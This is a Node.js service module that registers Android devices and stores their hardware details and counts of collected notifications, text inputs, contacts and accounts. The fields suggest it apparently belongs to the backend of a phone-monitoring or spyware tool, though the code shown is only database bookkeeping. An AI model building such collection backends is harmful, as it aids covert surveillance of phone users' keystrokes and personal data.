const Device = require('../models/Device');

class DeviceService {
    
    async createOrUpdateDevice(deviceData) {
        try {
            const {
                deviceId,
                deviceModel,
                deviceBrand,
                androidVersion,
                apiLevel,
                screenResolution,
                totalStorage,
                availableStorage,
                ramSize,
                cpuArchitecture,
                isRooted
            } = deviceData;

            // Check if device exists
            let device = await Device.findOne({ deviceId });
            
            if (device) {
                // Update existing device
                device.deviceModel = deviceModel || device.deviceModel;
                device.deviceBrand = deviceBrand || device.deviceBrand;
                device.androidVersion = androidVersion || device.androidVersion;
                device.apiLevel = apiLevel || device.apiLevel;
                device.screenResolution = screenResolution || device.screenResolution;
                device.totalStorage = totalStorage || device.totalStorage;
                device.availableStorage = availableStorage || device.availableStorage;
                device.ramSize = ramSize || device.ramSize;
                device.cpuArchitecture = cpuArchitecture || device.cpuArchitecture;
                device.isRooted = isRooted !== undefined ? isRooted : device.isRooted;
                device.lastSeen = new Date();
                
                await device.save();
                console.log(`📱 Updated existing device: ${deviceId} (${deviceModel})`);
            } else {
                // Create new device
                device = new Device({
                    deviceId,
                    deviceModel,
                    deviceBrand,
                    androidVersion,
                    apiLevel,
                    screenResolution,
                    totalStorage,
                    availableStorage,
                    ramSize,
                    cpuArchitecture,
                    isRooted,
                    firstSeen: new Date(),
                    lastSeen: new Date()
                });
                
                await device.save();
                console.log(`📱 Created new device: ${deviceId} (${deviceModel})`);
            }

            return {
                success: true,
                device: device
            };

        } catch (error) {
            console.error('❌ Error creating/updating device:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    async getDeviceById(deviceId) {
        try {
            const device = await Device.findOne({ deviceId });
            return {
                success: true,
                device: device
            };
        } catch (error) {
            console.error('❌ Error getting device by ID:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    async getAllDevices() {
        try {
            const devices = await Device.find({})
                .sort({ lastSeen: -1 })
                .lean();
            
            return {
                success: true,
                devices: devices
            };
        } catch (error) {
            console.error('❌ Error getting all devices:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    async updateDeviceStats(deviceId, stats) {
        try {
            const device = await Device.findOne({ deviceId });
            if (!device) {
                return {
                    success: false,
                    error: 'Device not found'
                };
            }

            // Update statistics
            if (stats.totalNotifications !== undefined) {
                device.totalNotifications = stats.totalNotifications;
            }
            if (stats.totalTextInputs !== undefined) {
                device.totalTextInputs = stats.totalTextInputs;
            }
            if (stats.totalContacts !== undefined) {
                device.totalContacts = stats.totalContacts;
            }
            if (stats.totalAccounts !== undefined) {
                device.totalAccounts = stats.totalAccounts;
            }

            device.lastSeen = new Date();
            await device.save();

            return {
                success: true,
                device: device
            };

        } catch (error) {
            console.error('❌ Error updating device stats:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }

    async getDeviceStats() {
        try {
            const stats = await Device.aggregate([
                {
                    $group: {
                        _id: null,
                        totalDevices: { $sum: 1 },
                        totalNotifications: { $sum: '$totalNotifications' },
                        totalTextInputs: { $sum: '$totalTextInputs' },
                        totalContacts: { $sum: '$totalContacts' },
                        totalAccounts: { $sum: '$totalAccounts' }
                    }
                }
            ]);

            return {
                success: true,
                stats: stats[0] || {
                    totalDevices: 0,
                    totalNotifications: 0,
                    totalTextInputs: 0,
                    totalContacts: 0,
                    totalAccounts: 0
                }
            };

        } catch (error) {
            console.error('❌ Error getting device stats:', error);
            return {
                success: false,
                error: error.message
            };
        }
    }
}

module.exports = new DeviceService();
